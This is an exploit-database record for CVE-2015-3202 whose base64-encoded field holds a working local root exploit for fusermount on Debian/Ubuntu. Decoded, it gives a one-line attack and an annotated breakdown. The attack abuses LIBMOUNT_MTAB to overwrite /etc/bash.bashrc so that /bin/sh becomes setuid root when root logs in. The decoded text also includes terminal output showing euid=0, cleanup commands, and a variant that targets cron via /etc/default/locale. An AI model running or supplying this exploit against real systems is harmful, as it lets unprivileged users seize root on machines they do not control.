{
    "source": "exploit-database", 
    "exploit": "U291cmNlOiBodHRwczovL2dpc3QuZ2l0aHViLmNvbS90YXZpc28vZWNiNzBlYjEyZDQ2MWRkODVjYmENClR3ZWV0OiBodHRwczovL3R3aXR0ZXIuY29tL3Rhdmlzby9zdGF0dXMvNjAxMzcwNTI3NDM3OTY3MzYwDQpSZWNvbW1lbmQgUmVhZGluZzogaHR0cDovL3NlY2xpc3RzLm9yZy9vc3Mtc2VjLzIwMTUvcTIvNTIwDQpZb3VUdWJlOiBodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PVYwaTN1SkpQSjg4DQoNCg0KDQojIE1ha2luZyBhIGRlbW8gZXhwbG9pdCBmb3IgQ1ZFLTIwMTUtMzIwMiBvbiBVYnVudHUgZml0IGluIGEgdHdlZXQuDQogDQoxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MA0KYT0vdG1wLy4kJDtiPWNobW9kXCB1K3N4O2VjaG8gJGIgL2Jpbi9zaD4kYTskYiAkYTthKz1cOyRhO21rZGlyIC1wICRhO0xJQk1PVU5UX01UQUI9L2V0Yy8kMC4kMHJjIF9GVVNFX0NPTU1GRD0wIGZ1c2VybW91bnQgJGEgI0NWRS0yMDE1LTMyMDINCiANCiMgSGVyZSdzIGhvdyBpdCB3b3JrcywgJGEgaG9sZHMgdGhlIG5hbWUgb2YgYSBzaGVsbHNjcmlwdCB0byBiZSBleGVjdXRlZCBhcw0KIyByb290Lg0KYT0vdG1wLy4kJDsNCiANCiMgJGIgaXMgdXNlZCB0d2ljZSwgZmlyc3QgdG8gYnVpbGQgdGhlIGNvbnRlbnRzIG9mIHNoZWxsc2NyaXB0ICRhLCBhbmQgdGhlbiBhcw0KIyBhIGNvbW1hbmQgdG8gbWFrZSAkYSBleGVjdXRhYmxlLiBRdW90ZXMgYXJlIHVudXNlZCB0byBzYXZlIGEgY2hhcmFjdGVyLCBzbw0KIyB0aGUgc2VwZXJhdG9yIG11c3QgYmUgZXNjYXBlZC4NCmI9Y2htb2RcIHUrc3g7DQogDQojIEJ1aWxkIHRoZSBzaGVsbHNjcmlwdCAkYSwgd2hpY2ggc2hvdWxkIGNvbnRhaW4gImNobW9kIHUrc3ggL2Jpbi9zaCIsIG1ha2luZw0KIyAvYmluL3NoIHNldHVpZCByb290LiBUaGlzIG9ubHkgd29ya3Mgb24gRGViaWFuL1VidW50dSBiZWNhdXNlIHRoZXkgdXNlIGRhc2gsDQojIGFuZCBkb250IG1ha2UgaXQgZHJvcCBwcml2aWxlZ2VzLg0KIw0KIyBodHRwOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxMy8wOC8yMi8xMg0KIw0KZWNobyAkYiAvYmluL3NoPiRhOw0KIA0KIyBOb3cgbWFrZSB0aGUgJGEgc2NyaXB0IGV4ZWN1dGFibGUgdXNpbmcgdGhlIGNvbW1hbmQgaW4gJGIuIFRoaXMgbmVlZGxlc3NseQ0KIyBzZXRzIHRoZSBzZXR1aWQgYml0LCBidXQgdGhhdCBkb2Vzbid0IGRvIGFueSBoYXJtLg0KJGIgJGE7DQogDQojIE5vdyBtYWtlICRhIHRoZSBkaXJlY3Rvcnkgd2Ugd2FudCBmdXNlcm1vdW50IHRvIHVzZS4gVGhpcyBkaXJlY3RvcnkgbmFtZSBpcw0KIyB3cml0dGVuIHRvIGFuIGFyYml0cmFyeSBmaWxlIGFzIHBhcnQgb2YgdGhlIHZ1bG5lcmFiaWxpdHksIHNvIG5lZWRzIHRvIGJlDQojIGZvcm1lZCBzdWNoIHRoYXQgaXQncyBhIHZhbGlkIHNoZWxsIGNvbW1hbmQuDQphKz1cOyRhOw0KIA0KIyBDcmVhdGUgdGhlIG1vdW50IHBvaW50IGZvciBmdXNlcm1vdW50Lg0KbWtkaXIgLXAgJGE7DQogDQojIGZ1c2VybW91bnQgY2FsbHMgc2V0dWlkKGdldGV1aWQoKSkgdG8gcmVzZXQgdGhlIHJ1aWQgd2hlbiBpdCBpbnZva2VzDQojIC9iaW4vbW91bnQgc28gdGhhdCBpdCBjYW4gdXNlIHByaXZpbGVnZWQgbW91bnQgb3B0aW9ucyB0aGF0IGFyZSBub3JtYWxseQ0KIyByZXN0cmljdGVkIGlmIHJ1aWQgIT0gZXVpZC4gVGhhdCdzIGFjY2VwdGFibGUgKGJ1dCBzY2FyeSkgaW4gdGhlb3J5LCBiZWNhdXNlDQojIGZ1c2VybW91bnQgY2FuIHNhbml0aXplIHRoZSBjYWxsIHRvIG1ha2Ugc3VyZSBpdCdzIHNhZmUuDQojDQojIEhvd2V2ZXIsIGJlY2F1c2UgbW91bnQgdGhpbmtzIGl0J3MgYmVpbmcgaW52b2tlZCBieSByb290LCBpdCBhbGxvd3MNCiMgYWNjZXNzIHRvIGRlYnVnZ2luZyBmZWF0dXJlcyB2aWEgdGhlIGVudmlyb25tZW50IHRoYXQgd291bGQgbm90IG5vcm1hbGx5IGJlDQojIHNhZmUgZm9yIHVucHJpdmlsZWdlZCB1c2VycyBhbmQgZnVzZXJtb3VudCBkb2Vzbid0IHNhbml0aXplIHRoZW0uDQojDQojIFRoZXJlZm9yZSwgdGhlIGJ1ZyBpcyB0aGF0IHRoZSBlbnZpcm9ubWVudCBpcyBub3QgY2xlYXJlZCB3aGVuIGNhbGxpbmcgbW91bnQNCiMgd2l0aCBydWlkPTAuIE9uZSBkZWJ1Z2dpbmcgZmVhdHVyZSBhdmFpbGFibGUgaXMgY2hhbmdpbmcgdGhlIGxvY2F0aW9uIG9mDQojIC9ldGMvbXRhYiBieSBzZXR0aW5nIExJQk1PVU5UX01UQUIsIHdoaWNoIHdlIGNhbiBhYnVzZSB0byBvdmVyd3JpdGUgYXJiaXRyYXJ5DQojIGZpbGVzLg0KIw0KIyBJbiB0aGlzIGNhc2UsIEknbSB0cnlpbmcgdG8gb3ZlcndyaXRlIC9ldGMvYmFzaC5iYXNocmMgKHVzaW5nIHRoZSBuYW1lIG9mIHRoZQ0KIyBjdXJyZW50IHNoZWxsIGZyb20gJDAuLi5zbyBpdCBvbmx5IHdvcmtzIGlmIHlvdSdyZSB1c2luZyBiYXNoISkuDQojDQojIFRoZSBsaW5lIHdyaXR0ZW4gYnkgZnVzZXJtb3VudCB3aWxsIGxvb2sgbGlrZSB0aGlzOg0KIw0KIyAvZGV2L2Z1c2UgL3RtcC8uMTIzOy90bXAvLjEyMyBmdXNlIHh4eCx4eHgseHh4LHh4eA0KIw0KIyBXaGljaCB3aWxsIHRyeSB0byBleGVjdXRlIC9kZXYvZnVzZSB3aXRoIHRoZSBwYXJhbXRlciAvdG1wL18sIGZhaWwgYmVjYXVzZQ0KIyAvZGV2L2Z1c2UgaXMgYSBkZXZpY2Ugbm9kZSwgYW5kIHRoZW4gZXhlY3V0ZSAvdG1wL18gd2l0aCB0aGUgcGFyYW1ldGVycyBmdXNlDQojIHh4eCx4eHgseHh4LHh4eC4gVGhpcyBtZWFucyBleGVjdXRpbmcgL2Jpbi9zaCB3aWxsIGdpdmUgeW91IGEgcm9vdCBzaGVsbCB0aGUNCiMgbmV4dCB0aW1lIHJvb3QgbG9ncyBpbi4NCiMNCiMgQW5vdGhlciB3YXkgdG8gZXhwbG9pdCBpdCB3b3VsZCBiZSBvdmVyd3JpdGluZyAvZXRjL2RlZmF1bHQvbG9jYWxlLCB0aGVuDQojIHdhaXRpbmcgZm9yIGNyb24gdG8gcnVuIC9ldGMvY3Jvbi5kYWlseS9hcHQgYXQgbWlkbmlnaHQuIFRoYXQgbWVhbnMgcm9vdA0KIyB3b3VsZG4ndCBoYXZlIHRvIGxvZyBpbiwgYnV0IHlvdSB3b3VsZCBoYXZlIHRvIHdhaXQgYXJvdW5kIHVudGlsIG1pZG5pZ2h0IHRvDQojIGNoZWNrIGlmIGl0IHdvcmtlZC4NCiMNCiMgQW5kIHdlIGhhdmUgZW5vdWdoIGNoYXJhY3RlcnMgbGVmdCBmb3IgYSBoYXNoIHRhZy9jb21tZW50Lg0KTElCTU9VTlRfTVRBQj0vZXRjLyQwLiQwcmMgX0ZVU0VfQ09NTUZEPTAgZnVzZXJtb3VudCAkYSAjQ1ZFLTIwMTUtMzIwMg0KIA0KIyBIZXJlIGlzIGhvdyB0aGUgZXhwbG9pdCBsb29rcyB3aGVuIHlvdSBydW4gaXQ6DQojDQojICQgYT0vdG1wL187Yj1jaG1vZFwgdStzeDtlY2hvICRiIC9iaW4vc2g+JGE7JGIgJGE7YSs9XDskYTtta2RpciAtcCAkYTtMSUJNT1VOVF9NVEFCPS9ldGMvJDAuJDByYyBfRlVTRV9DT01NRkQ9MCBmdXNlcm1vdW50ICRhICNDVkUtMjAxNS0zMjAyDQojIGZ1c2VybW91bnQ6IGZhaWxlZCB0byBvcGVuIC9ldGMvZnVzZS5jb25mOiBQZXJtaXNzaW9uIGRlbmllZA0KIyBzZW5kaW5nIGZpbGUgZGVzY3JpcHRvcjogU29ja2V0IG9wZXJhdGlvbiBvbiBub24tc29ja2V0DQojICQgY2F0IC9ldGMvYmFzaC5iYXNocmMgDQojIC9kZXYvZnVzZSAvdG1wL187L3RtcC9fIGZ1c2Ugcncsbm9zdWlkLG5vZGV2LHVzZXI9dGF2aXNvIDAgMA0KIw0KIyBOb3cgd2hlbiByb290IGxvZ3MgaW4gbmV4dC4uLg0KIyAkIHN1ZG8gLXMNCiMgYmFzaDogL2Rldi9mdXNlOiBQZXJtaXNzaW9uIGRlbmllZA0KIyAjIGxzIC1MbCAvYmluL3NoDQojIC1yd3NyLXhyLXggMSByb290IHJvb3QgMTIxMjcyIEZlYiAxOSAgMjAxNCAvYmluL3NoDQojICMgZXhpdA0KIyAkIHNoIC1jICdpZCcNCiMgZXVpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpDQojDQojIFRvIHJlcGFpciB0aGUgZGFtYWdlIGFmdGVyIHRlc3RpbmcsIGRvIHRoaXM6DQojDQojICQgc3VkbyBybSAvZXRjL2Jhc2guYmFzaHJjDQojICQgc3VkbyBhcHQtZ2V0IGluc3RhbGwgLW8gRHBrZzo6T3B0aW9uczo6PSItLWZvcmNlLWNvbmZtaXNzIiAtLXJlaW5zdGFsbCAtbSBiYXNoDQojICQgc3VkbyBjaG1vZCAwNzU1IC9iaW4vc2gNCiMgJCBzdWRvIHVtb3VudCAvdG1wLy4kJFw7L3RtcC8uJCQNCiMgJCBybSAtcmYgL3RtcC8uJCQgL3RtcC8uJCRcOw0KIw0KDQoNCi0gLSAtIC0gLSAtIC0gLSAtIC0gLQ0KDQoNCiQgcHJpbnRmICJjaG1vZCA0NzU1IC9iaW4vZGFzaCIgPiAvdG1wL2V4cGxvaXQgJiYgY2htb2QgNzU1IC90bXAvZXhwbG9pdA0KJCBta2RpciAtcCAnL3RtcC9leHBsb2l0fHwvdG1wL2V4cGxvaXQnDQokIExJQk1PVU5UX01UQUI9L2V0Yy9iYXNoLmJhc2hyYyAgX0ZVU0VfQ09NTUZEPTAgZnVzZXJtb3VudCAnL3RtcC9leHBsb2l0fHwvdG1wL2V4cGxvaXQnDQpmdXNlcm1vdW50OiBmYWlsZWQgdG8gb3BlbiAvZXRjL2Z1c2UuY29uZjogUGVybWlzc2lvbiBkZW5pZWQNCnNlbmRpbmcgZmlsZSBkZXNjcmlwdG9yOiBTb2NrZXQgb3BlcmF0aW9uIG9uIG5vbi1zb2NrZXQNCiQgY2F0IC9ldGMvYmFzaC5iYXNocmMNCi9kZXYvZnVzZSAvdG1wL2V4cGxvaXR8fC90bXAvZXhwbG9pdCBmdXNlIHJ3LG5vc3VpZCxub2Rldix1c2VyPXRhdmlzbyAwIDANCg0KVGhlbiBzaW1wbHkgd2FpdCBmb3Igcm9vdCB0byBsb2dpbiwgb3IgYWx0ZXJuYXRpdmVseSBvdmVyd3JpdGUNCi9ldGMvZGVmYXVsdC9sb2NhbGUgYW5kIHdhaXQgZm9yIGNyb24gdG8gcnVuIGEgc2NyaXB0IHRoYXQgc291cmNlcyBpdC4NClRoYXQgbWVhbnMgcm9vdCB3b3VsZG4ndCBoYXZlIHRvIGxvZyBpbiwgYnV0IHlvdSB3b3VsZCBoYXZlIHRvIHdhaXQNCmFyb3VuZCB1bnRpbCBtaWRuaWdodCB0byBjaGVjayBpZiBpdCB3b3JrZWQu", 
    "filename": "platforms/linux/local/37089.txt", 
    "id": "37089", 
    "cves": [
        "CVE-2015-3202"
    ]
}